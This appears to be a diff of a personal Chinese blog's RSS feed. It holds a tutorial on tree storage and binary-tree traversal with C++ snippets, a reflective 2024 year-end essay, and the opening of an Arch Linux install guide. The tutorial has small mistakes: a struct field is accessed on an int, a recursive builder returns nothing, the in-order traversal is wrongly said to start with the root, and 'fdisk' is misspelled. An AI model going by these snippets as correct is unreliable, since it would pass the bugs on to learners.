+&lt;p&gt;同理可推出真$k$叉树、满$k$叉树和完全$k$叉树的定义。&lt;/p&gt;
+&lt;h3&gt;4.3.二叉树的性质&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;在二叉树的第$i$层上至多有$2^{i-1}$个节点&lt;/li&gt;
+&lt;li&gt;深度为$k$的二叉树至多有$2^k-1$个节点（满二叉树）&lt;/li&gt;
+&lt;li&gt;对于任意一棵二叉树，若叶子数为$n_0$，度为$2$的节点数为$n_2$，则$n_0=n_2+1$&lt;/li&gt;
+&lt;li&gt;具有$n$个节点的完全二叉树深度必为$\lfloor \log_2n\rfloor+1$&lt;/li&gt;
+&lt;li&gt;对于完全二叉树，若从上至下，从左至右编号，则编号为$i$的节点，其左孩子编号必为$2i$，右孩子编号必为$2i+1$，双亲编号必为$i/2$&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;5.不同树之间的转换&lt;/h2&gt;
+&lt;p&gt;选取一个根节点，可以将任意自由树转换为有根树。&lt;/p&gt;
+&lt;p&gt;创建一个根节点，将其与多个有根树的根节点相连，可以将森林转换为有根树。&lt;/p&gt;
+&lt;p&gt;将长子作为左子节点，兄弟作为右子节点，可以将任何一棵树转换为二叉树，如图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;转换为：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>图论算法二：树的存储与遍历</title><link>https://ssl.ztsubaki.xyz/posts/7/7/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/7/7/</guid><description>图论算法系列第二篇，讲解树的两种存储方式和二叉树的遍历与还原</description><pubDate>Sun, 19 Jan 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1.树的存储&lt;/h2&gt;
+&lt;h3&gt;1.1.顺序存储&lt;/h3&gt;
+&lt;p&gt;使用一段连续的存储空间，存储所有的树的信息&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;index(data)&lt;/th&gt;
+&lt;th&gt;parent&lt;/th&gt;
+&lt;th&gt;child1&lt;/th&gt;
+&lt;th&gt;child2&lt;/th&gt;
+&lt;th&gt;childn&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;-1&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;-1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;-1&lt;/td&gt;
+&lt;td&gt;-1&lt;/td&gt;
+&lt;td&gt;-1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;-1&lt;/td&gt;
+&lt;td&gt;-1&lt;/td&gt;
+&lt;td&gt;-1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;使用结构体定义节点，代码如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;struct node{
+    T data;
+    int parent;
+    int child[k];
+} nodes[n];
+//k为节点的最大度，n为最大节点数
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;增加节点时：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void insert(int x,int y)
+{
+    for(int i = 0;i &amp;lt; k;i ++)
+    {
+        if(nodes[x].child[i]==-1)
+        {
+            nodes[x].child[i]=y;
+            break;
+        }
+    }
+    nodes[y].parent = x;
+    for(int i = 0;i &amp;lt; k;i ++) nodes[y].child[i] = -1;
+}
+//省略数据域
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;顺序存储通常适用于树的最大度数确定时，二叉树常用这种方式存储。&lt;/p&gt;
+&lt;p&gt;在一定情况下，顺序存储可以不存储父节点，或者不存储子节点，也可以还原出整棵树来。&lt;/p&gt;
+&lt;p&gt;当最大度数不确定时，子节点数难以确定，同时如果节点度数差异较大，则顺序存储会浪费很大空间，此时就需要采取链式存储。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例题：给出一个最大度数不超过$10$的树，节点从A-Z编号，输入一个数字$n$表示节点数，此后$n-1$行每行两个字母$x,y$表示从$x$到$y$的边。保证第$2$行第一个字母为根节点，所有节点按层次顺序出现。输出它的顺序存储形式。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;1.2.链式存储&lt;/h3&gt;
+&lt;p&gt;将顺序存储的&lt;code&gt;child&lt;/code&gt;数组采用链表存储就是链式存储。&lt;/p&gt;
+&lt;p&gt;节点仅需记录第一个子节点与下一个子节点的编号：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;struct node{
+    T data;
+    int parent;
+    int head;
+    int next;
+} nodes[n];
+//n为最大节点数
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;插入时，需要找到父节点子节点链表的顶端插入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void insert(int x,int y)
+{
+    int k = nodes[x].head;
+    if(k==-1) nodes[x].head = y;
+    else{
+    	while(nodes[k].next!=-1) k = nodes[k].next;
+    	nodes[k].next = y;
+    }
+    y.parent = x;
+    y.head = -1;
+    y.next = -1;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;需要遍历子节点时，则遍历整个链表：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int k = nodes[x].head;
+while(k!=-1)
+{
+	//do something
+    k = nodes[k].next;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例题：给出一个树，节点从A-Z编号，输入一个数字$n$表示节点数，此后$n-1$行每行两个字母$x,y$表示从$x$到$y$的边。保证第$2$行第一个字母为根节点，所有节点按层次顺序出现。输出$n$行，第$i$行包含第$i$个节点所有子节点对应的字母，中间用空格隔开。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;1.3.二叉树存储&lt;/h3&gt;
+&lt;p&gt;一般的二叉树通常采用顺序存储，此处不再赘述。&lt;/p&gt;
+&lt;p&gt;而对于一般的有根树，我们也可以将其按照前文所述的方式转化为二叉树存储。&lt;/p&gt;
+&lt;p&gt;不难发现，实际上我们将有根树转换为二叉树时也采用了链表的思想，二叉树的左子节点代表在树中的第一个子节点，右子节点则代表树中该节点的兄弟节点，即链表中的下一项，这样一来，将我们链式存储中的链表当成二叉树，就可以得到按照前文规则转化后的二叉树了。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例题：给出一个树，节点从A-Z编号，输入一个数字$n$表示节点数，此后$n-1$行每行两个字母$x,y$表示从$x$到$y$的边。保证第$2$行第一个字母为根节点，所有节点按层次顺序出现。输出这棵树转换成二叉树后的顺序存储形式。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;2.树的遍历&lt;/h2&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;本节仅讨论二叉树的遍历，一般的树转换为二叉树再遍历即可。&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h3&gt;2.1.遍历&lt;/h3&gt;
+&lt;p&gt;二叉树的遍历有三种顺序：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;前序遍历：根节点，左子树，右子树&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;中序遍历：左子树，根节点，右子树&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;后序遍历：左子树，右子树，根节点&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;左子节点，右子节点顺序不变，“前”“中”“后”指根节点的位置。&lt;/p&gt;
+&lt;p&gt;对于每个二叉树，按照这个顺序递归下去就可以得到完整的遍历。&lt;/p&gt;
+&lt;p&gt;如下图所示二叉树：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;前序遍历为：&lt;code&gt;ABEFCDGHI&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;中序遍历为：&lt;code&gt;EFBCHGIDA&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;后序遍历为：&lt;code&gt;FEHIGDCBA&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;体现在代码中，即为操作的顺序：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void rab(int x)
+{
+    if(x==-1) return;
+    std::cout &amp;lt;&amp;lt; nodes[x].data &amp;lt;&amp;lt; &apos; &apos;;
+    rab(nodes[x].lchild);
+    rab(nodes[x].rchild);
+}//前序遍历
+void arb(int x)
+{
+    if(x==-1) return;
+    arb(nodes[x].lchild);
+    std::cout &amp;lt;&amp;lt; nodes[x].data &amp;lt;&amp;lt; &apos; &apos;;
+    arb(nodes[x].rchild);
+}//中序遍历
+void abr(int x)
+{
+    if(x==-1) return;
+    abr(nodes[x].lchild);
+    abr(nodes[x].rchild);
+    std::cout &amp;lt;&amp;lt; nodes[x].data &amp;lt;&amp;lt; &apos; &apos;;
+}//后序遍历
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例题：B3642 二叉树的遍历&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;2.2.还原&lt;/h3&gt;
+&lt;p&gt;根据二叉树的前序遍历和中序遍历或者后序遍历和中序遍历可以唯一还原一棵二叉树。&lt;/p&gt;
+&lt;p&gt;对于任意一棵树，其中序遍历的第一项就是他的根，接着是它的左子树和右子树，那么根据前序遍历我们就可以确定根节点。&lt;/p&gt;
+&lt;p&gt;而在中序遍历中，根节点左边就是左子树，根节点右边就是右子树，根据前面确定的根节点，我们就可以得出树的左子树和右子树的中序遍历，再结合子树长度不变，我们就可以得出两个子树的前序遍历，这样我们就可以递归计算两个子树的情况了。&lt;/p&gt;
+&lt;p&gt;代码实现如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int build(int rab_index,int arb_index,int len)
+{
+    if(!len) return -1;
+    int root = rab[rab_index];
+    int i = 0;
+    for(;i &amp;lt; len;i ++) if(arb[arb_index+i]==root) break;
+    nodes[root].lchild = build(rab_index+1,arb_index,i);
+    nodes[root].rchild = build(rab_index+i+1,arb_index+i+1,len-i-1);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;后序遍历思路与此相同。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例题：给出一个节点由大写字母表示的二叉树的前序遍历和中序遍历，求该二叉树的后序遍历。&lt;/p&gt;
+&lt;/blockquote&gt;
+</content:encoded></item><item><title>2024 我的故事未写完</title><link>https://ssl.ztsubaki.xyz/posts/5/5/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/5/5/</guid><description>2024年度总结</description><pubDate>Tue, 31 Dec 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;2024，从飞舞的烟花中开始。&lt;/p&gt;
+&lt;p&gt;2024，在安静的夜空中结束。&lt;/p&gt;
+&lt;p&gt;2023年12月31日，在迟到了数月的生日中，我迎来了自己的的18岁。&lt;/p&gt;
+&lt;p&gt;那个夜晚，我在小城喧闹的广场上结束了2023的最后一晚，绚丽的焰火照亮了天边，火药的气味助长着热烈的氛围，愿望随着孔明灯飞向无边的夜空。&lt;/p&gt;
+&lt;p&gt;那一刻，我迫不及待将时钟拿给身边最熟悉的人，身边迎来了一场爆发，平时沉寂的小城在那一刻迸发出了一年积攒的热情，绚烂的烟花🎇将我们包围，希望，期许，也一并在我们的心中升起。&lt;/p&gt;
+&lt;p&gt;这是属于我们的一年。18岁的夏天，我们都要走进那个考场，命运在那一刻是希望的模样，而命运定格的瞬间，又是否如我们期许的样子？&lt;/p&gt;
+&lt;p&gt;至少，2024年12月31日，我再也看不到那热烈的焰火了。&lt;/p&gt;
+&lt;p&gt;刚开始，我还沉浸在那期许之中，未来还是待书写的未知数。我第二遍看了京吹，猛然间发现，之前那个对什么都无所谓的我也变得不甘心，变得想要伸手去触碰月亮，带着期许，踮起脚尖啊...&lt;/p&gt;
+&lt;p&gt;然而，学校的制度改变和宿舍的关系却让我无法忍受，几乎被迫着主动提出了走读申请，一段时间斡旋之后，我在最后一个学期搬到了学校门口的高楼之中。&lt;/p&gt;
+&lt;p&gt;我养了自己的小金鱼，可是由于缺氧，很快就去世了一条，只剩孤零零一条。我种了自己的向日葵，在网上研究了好多方法，希望向日葵🌻和自己都能充满希望的生长。&lt;/p&gt;
+&lt;p&gt;我还记得，四年前，有人写过一句话，“没有阳光的向日葵”。&lt;/p&gt;
+&lt;p&gt;在高楼之上，我几乎听不见下面的声音，只看看着人群与车流川流不息。下雨时，我能看到烟雨中模糊的城市，看到沸腾的小湖泊，而我的周围是那样的安静。某天晚上，我就坐在窗台上，窗外的霓虹缓缓移动，城市在慢慢睡去，霓虹是它夜里的吐息，向日葵静静生长着，金鱼也安静游弋，我看着书，听着歌，我喜欢这样的感觉。&lt;/p&gt;
+&lt;p&gt;可是，宁静总是暂时的。我也经历过风暴，在猩红的月光下，疯狂的风和凛冽的雨滴全部汇聚到我的身上，整个城市像是一个巨兽，摇晃的数目是它的牙齿，高耸的楼房好像要把我淹没。&lt;/p&gt;
+&lt;p&gt;我也观察过细雨中匆匆的人们，也试过在细雨中行走，可是冰冷的雨后却还是冰冷的现实。&lt;/p&gt;
+&lt;p&gt;我的向日葵一度长得很高，很大，在蓝天的背景下，我看到它骄傲地绽放，那样昂着头向着蓝天，我看到了它的向往啊...&lt;/p&gt;
+&lt;p&gt;那段时间，我也一次次突破了自己的极限，成为了别人眼中的“黑马”。我失败了那么多次啊，我以为我只要踮起脚就能碰到月亮了，可是和三年前一样的频繁失利又让我回到现实，高处不胜寒，起舞弄清影，何似在人间。&lt;/p&gt;
+&lt;p&gt;很快，我的向日葵结束了盛放。它的花瓣开始凋谢，哪怕仍然抬着头，却像一个落败的将军，只是不肯放下荣誉。&lt;/p&gt;
+&lt;p&gt;2024年6月6日晚，我从紧张的复习中抽出身，坐在图书馆的楼顶，抬起头，我眼里只剩下了夜空与高楼，脑海里第一次产生了那样的想法：三个月后我会看到哪里的高楼？&lt;/p&gt;
+&lt;p&gt;2024年6月8日下午，一切尘埃落定，我也知道了自己不是那匹“黑马”，而另一边，我迈出了最勇敢的一步，在结束的第一时间，我顶着堵车冲到了另一所学校，和认识了5年的女孩子告白了，我们一起走进了人生的新阶段。&lt;/p&gt;
+&lt;p&gt;2024年6月13日，我第一次登上了离开18年不曾走出的云南省的飞机。太多的第一次难以叙述，可是当我们迷失在虹桥机场周围，身上都是潮湿的气息，在高架与路口间无所适从的时候，我们知道，这座城市并不欢迎我们。&lt;/p&gt;
+&lt;p&gt;无论是在陆家嘴还是在外滩，看着来来往往的人群，我只能戴上耳机，把声音开到最大，屏蔽这嘈杂与喧闹。人们来去匆匆，世界像是按下了加速键，人们在被高楼挤压又被高架划分成好几层的逼仄空间里快速移动，只有我留在漩涡的中心，一切都与我无关，一切都不属于我，我就这样迷失在人群中。&lt;/p&gt;
+&lt;p&gt;直到在这拥挤的车水马龙中，我意外找到了城市中的棚户区，与这个城市的其他地方不同，杂乱与无序充斥着这里，没有高耸的楼房，只有利用到极致的空间和失意落魄的年轻人。当我抬起头，眼中是交错缠绕的电缆，背景是高耸入云的大厦，我竟无法形容那时的感受。&lt;/p&gt;
+&lt;p&gt;哪怕是光鲜亮丽的外滩，背后也是杂乱的街道和随意堆放的共享单车。&lt;/p&gt;
+&lt;p&gt;最后一天在南京路步行街上，我们躲着陌生的外国面孔，又被熟悉的面孔挤来挤去，却不敢走进那些大型商场，只感到无所适从。&lt;/p&gt;
+&lt;p&gt;我们逃离了那里，最后在苏州站外护城河的边上坐着吹着风找到了慰藉，也误闯了居民区，却没有周围压迫的高楼，这里的节奏是那么缓慢，就像载着我们离开上海的老式绿皮火车，慢到我可以在上面听完另一个截然不同的故事。&lt;/p&gt;
+&lt;p&gt;这些城市好像就是为城市里的居民准备的，于我们这些从农村里长大的孩子而言，感受到的只有割裂。&lt;/p&gt;
+&lt;p&gt;在杭州匆忙的一晚，不知是细雨还是远离市中心的缘故，我总算感到了难得的平静，但直到最后在高铁上看到熟悉的红土地，我才真正放下心来。&lt;/p&gt;
+&lt;p&gt;后来，我独自完成了第一次装机，从自己写配置，到购买安装，满满成就感。同时一边测试一边用刚插完所有硬件的毛坯房查出了高考成绩。不高，也不低。&lt;/p&gt;
+&lt;p&gt;说是遗憾吧，算不上，说是没有遗憾吧，就更不可能了。&lt;/p&gt;
+&lt;p&gt;后来参加了招生交流，和合适的学校都交流好了，只等结果。我以为我找到了去处，我以为我做出了完美的选择，可随后我却度过了最煎熬的一天——所有人的录取结果都出来了，只有我没有，等到快结束时，我知道了，我去到了一个根本没有想到的学校。&lt;/p&gt;
+&lt;p&gt;但好在专业是我选择的。&lt;/p&gt;
+&lt;p&gt;甚至和我三年前随便说的目标毫无区别。&lt;/p&gt;
+&lt;p&gt;我知道，这是命运的又一个玩笑，我的所有成功在结果上好像什么都不存在，2024在撕裂中开始了下一半。&lt;/p&gt;
+&lt;p&gt;那几天，京吹也完结了。久美子最终妥协了，留下了遗憾，虽然难受，可事实不就是这么残酷吗，遗憾才是大多数时间啊...我曾和她一样，对什么都无所谓，也因为一些契机慢慢改变，想变得更好，想踮起来够到月亮，虽然我没有她关照他人的能力，但最后还是得到了一样的遗憾。&lt;/p&gt;
+&lt;p&gt;也算不上是遗憾吧，或者说遗憾也是常有的吧。&lt;/p&gt;
+&lt;p&gt;此后，我回到了高中的奥赛队，以另一种身份，当了一个月的老师。表面上是知识渊博，不苟言笑的可靠老师，背地里也会和朋友像小孩子一样玩闹，也会到处搜索焦头烂额，也会临时上课才想起来备课，实在是个草台班子。&lt;/p&gt;
+&lt;p&gt;然而我却乐在其中，这是能实现我的价值的事。&lt;/p&gt;
+&lt;p&gt;就这样度过了闲暇的三个月，我最后还是迎来了离别。多少波折之后，曾经一起的伙伴都各奔东西，很多情绪难以言表，我就这样安静离开了故土，离开了朋友，离开了所爱之人。&lt;/p&gt;
+&lt;p&gt;高铁的速度很快，快到我来不及防备，大山不见了，代之的是一湾江水，是我带着父母第一次出远门，当年那个弱不禁风的小孩也长大了。上午在初升的太阳中告别，下午已经在热浪中来到了江城。&lt;/p&gt;
+&lt;p&gt;显然，相比四季如春的云南，外面的天气实在让人无法忍受，匆匆几天无趣的游玩之后，最后一天，我们坐在了学校路边的石阶上，看着太阳落下，沉默着看着来来往往的人——都结束了，一切都结束了，遗憾也好，欢乐也罢，说不清是怀念还是什么的，总之是怅然若失。&lt;/p&gt;
+&lt;p&gt;我送别了父母。后来的日子里，我像一只无头的苍蝇，四处乱撞。我参加了班委竞选，又参加了一系列算法竞赛，然而结果却不尽人意，或者说本来基础就弱。同时又加入了几个团队，各种各样的事务应接不暇，我试图寻找一瞬的安宁，但是事实是我根本停不下来。&lt;/p&gt;
+&lt;p&gt;十月，我去了长沙。在汹涌的人潮中，我也成了随波逐流的那一个。我曾经厌弃权贵，而如今却走上了班委这条路;我想帮助别人，却找不到那一个所谓的时机;我明明有着自己的理想，却还是一心攀附着虚荣，矛盾啊，随波逐流啊，这是我想要的大学生活吗？&lt;/p&gt;
+&lt;p&gt;我试图做出些什么改变，可是却无能为力。几个月下来，我从没有顾及过道路两旁的银杏叶，柜子里的相机也蒙上了灰尘，只有在组织集体活动时派上过用场，我忙忙碌碌追逐着自己都看不见的东西，却一点点忘却了来时的路。我曾在某天下课再一次抬头，却只见雾气笼罩了霓虹，光亮微弱而模糊，雾失楼台，月迷津渡......&lt;/p&gt;
+&lt;p&gt;冬天很快来临，刺骨寒风，吹不冷我凌乱的心。一次次疲于奔命，我没有时间做自己的事，慢慢失去了最初的光芒，慢慢颓废，2024最后的几天，沉浸在游戏之中，我无法原谅这样的自己，更无法与过去的自己和解。&lt;/p&gt;
+&lt;p&gt;我想抒写什么，我无声地嘶吼着挣扎，可是谁又能听见，最后只能寄希望于这个临时修起来的网站，也只能用最无力的文字书写。&lt;/p&gt;
+&lt;p&gt;一个学期即将结束，我只是疲于奔命了一个学期，也许没有任何实质性收获，也许什么都没学到，那时的梦啊，这无处容身的地方啊。我多么想，“穿过云层变得闪闪发光”，可是，“却依然不断寻求着救赎”啊...&lt;/p&gt;
+&lt;p&gt;最后的最后，我没有参加任何热闹的跨年活动，我发现我喜欢的不是热闹，而是在喜欢的故土，和喜欢的人在一起。我喜欢看到焰火承载着人们美好的心愿飞上天空，也喜欢宁静的田野上突如其来的喧闹，可惜这里不是故土，没有喜欢的人，没有焰火，更没有田野。&lt;/p&gt;
+&lt;p&gt;我的2024，总结下来就是几个关键词：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;遗憾&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;就像那提早调零的向日葵，我也提早凋谢了，没有完成最后的绽放，所有的一切结果都差强人意，不能说没有遗憾，也不能说多么遗憾。&lt;/p&gt;
+&lt;p&gt;我还记得8月31号的下午，在那石阶上，昏暗的金黄充盈了整个空间，时间像是定格了一样，耳机里是《Counter Attack(Piaon Ver)》，一个个音符震撼着灵魂，好像诉说着无法改变的事实，好像写尽了遗憾，却什么也说不出。&lt;/p&gt;
+&lt;p&gt;想像久美子一样喊出不甘，可我根本不知道自己在不甘什么，想像少女乐队的主角一样把一切都抒发出来，可我终究没有那个能力，连表达出遗憾也成了一种遗憾了吧。&lt;/p&gt;
+&lt;p&gt;遗憾是常有的吧。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;热爱&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;至今还记得高中时听到的一句话，“热爱可抵岁月长”，一路的热爱撑着我走到了这里，我也向我所热爱的事业迈出了不那么完美的第一步，也算是认识了一群志同道合的人，置于未来走向如何，就交给未来吧。我想，我有足够的热爱，总能见到光亮的吧。&lt;/p&gt;
+&lt;p&gt;我不知道出口在哪，我参加了算法竞赛，拖了后腿，被淘汰了，参加了CSP，刷了两遍才达标，最后放弃了参加蓝桥杯，参加了超算队，准备打HPC比赛，却什么都还不会，我没有时间，也没有傲人的天赋，没有系统学习过，总归是略逊一筹，只有一腔热血，却无能为力了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;撕裂&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;高考的到来，硬生生把2024的时间分裂成了两半，前一半是高中压抑的日常，后一半是大学迷茫的无序。&lt;/p&gt;
+&lt;p&gt;另一方面，我也看见了割裂的自己，想做什么都没有能力，想做的事太多，最终疲于奔命，什么都想做好，却一塌糊涂，动不动摆烂躺平，最后一无所获。&lt;/p&gt;
+&lt;p&gt;面对不同的场景，我似乎看见了完全不同的自己。在奥赛队教学的自己，在高中的自己，在大学的自己，作为班委的自己，面对家人和朋友的自己，一面谈笑风生，一面不苟言笑;一面充满激情，一面又躺平摆烂;一边活泼开朗，一边沉默寡言，总之，是连自己都无法理解的割裂。&lt;/p&gt;
+&lt;p&gt;最后，无论过去一年怎么样了，还是希望下一年自己能平静下来，做一些自己喜欢的事，如此便好。&lt;/p&gt;
+&lt;p&gt;我也始终满怀希望，希望平凡的自己，能有一份不甘于平凡的坚强与努力。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;いつかくる未来の私にとって&lt;br /&gt;
+总有一天我想要成为能让未来的自己&lt;/p&gt;
+&lt;p&gt;誇れる私でいたい&lt;br /&gt;
+感到骄傲的存在&lt;/p&gt;
+&lt;p&gt;真昼の空の月のように&lt;br /&gt;
+倘若能像正午天空的月亮&lt;/p&gt;
+&lt;p&gt;いつも強くはいられないけど&lt;br /&gt;
+然而我一直都坚强不起来&lt;/p&gt;
+&lt;p&gt;あの日の過ちも後悔も&lt;br /&gt;
+那一日 过错与后悔&lt;/p&gt;
+&lt;p&gt;全部全部私なんだよ&lt;br /&gt;
+这一切 全都是我啊&lt;/p&gt;
+&lt;p&gt;真冬の夜の冷たい心も&lt;br /&gt;
+严冬的夜晚 冰冷刺骨的心&lt;/p&gt;
+&lt;p&gt;真夏の朝の気だるさも&lt;br /&gt;
+仲夏的早上 起不来的倦怠&lt;/p&gt;
+&lt;p&gt;悲しみに暮れた君の涙も&lt;br /&gt;
+你沉溺于悲伤 掉的眼泪也好&lt;/p&gt;
+&lt;p&gt;無駄なことはひとつもないよ&lt;br /&gt;
+这其中没有一样 是毫无意义的&lt;/p&gt;
+&lt;p&gt;大事なことはいつだって&lt;br /&gt;
+值得珍重的那些事物&lt;/p&gt;
+&lt;p&gt;目を離した隙に消えてしまうんだ&lt;br /&gt;
+总是一离开我的视线 就瞬间消失&lt;/p&gt;
+&lt;p&gt;もう過ぎ去ったあの日に向かって&lt;br /&gt;
+尽管心仍向着已经逝去的那一日&lt;/p&gt;
+&lt;p&gt;手を伸ばしたって触れないけれど&lt;br /&gt;
+哪怕伸出手也还是无法触及&lt;/p&gt;
+&lt;p&gt;ありがとう全ての日々よ&lt;br /&gt;
+但我们仍感谢所有度过的每一天&lt;/p&gt;
+&lt;p&gt;真昼の空の月 &lt;br /&gt;
+——アビドス高等学校対策委員会&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;就像2023年初听到的那首歌，我的故事未写完。&lt;/p&gt;
+&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot;  src=&quot;//player.bilibili.com/player.html?isOutside=true&amp;amp;bvid=BV1JG4y1W7ub&amp;amp;t=35.371416&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
+</content:encoded></item><item><title>Arch Linux简单安装配置</title><link>https://ssl.ztsubaki.xyz/posts/4/4/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/4/4/</guid><description>记录KDE、Hyprland桌面环境下Arch Linux的安装配置和简单美化</description><pubDate>Fri, 27 Dec 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;仅记录个人配置，详细配置请查看&lt;a href=&quot;https://wiki.archlinuxcn.org/wiki/%E9%A6%96%E9%A1%B5&quot;&gt;ArchWiki&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h2&gt;1.安装&lt;/h2&gt;
+&lt;h3&gt;1.1.安装基本系统&lt;/h3&gt;
+&lt;h4&gt;进入Live介质&lt;/h4&gt;
+&lt;h4&gt;连接互联网&lt;/h4&gt;
+&lt;h5&gt;无线网连接方式&lt;/h5&gt;
+&lt;p&gt;进入&lt;code&gt;iwd&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;iwctl
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;查看并开启设备&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;device list
+#若device未开启则开启device，若对应adapter未开启则需要先开启adapter
+adapter adapter_name set-property Powered on
+device device_name set-property Powered on
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;扫描网络&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;station device_name scan
+#成功扫描不会有输出
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;列出网络&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;station device_name get-networks
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;连接网络&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;station device_name connect SSID
+#会要求输入网络密码
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;退出&lt;code&gt;iwd&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;quit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;检查网络连通性&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ping baidu.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;更新时间&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;timedatectl
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;创建硬盘分区&lt;/h4&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;BIOS启动模式下的安装方式请自行查看&lt;a href=&quot;https://wiki.archlinuxcn.org/wiki/%E9%A6%96%E9%A1%B5&quot;&gt;ArchWiki&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;查看存储设备&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;fidsk -l
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;M2硬盘一般为&lt;code&gt;/dev/nvme*n*&lt;/code&gt;，SATA硬盘一般为&lt;code&gt;/dev/sd*&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;选择使用的硬盘，进入&lt;code&gt;fdisk&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;fdisk /dev/device_name
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;必要分区如下&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;挂载点&lt;/th&gt;
+&lt;th&gt;格式&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
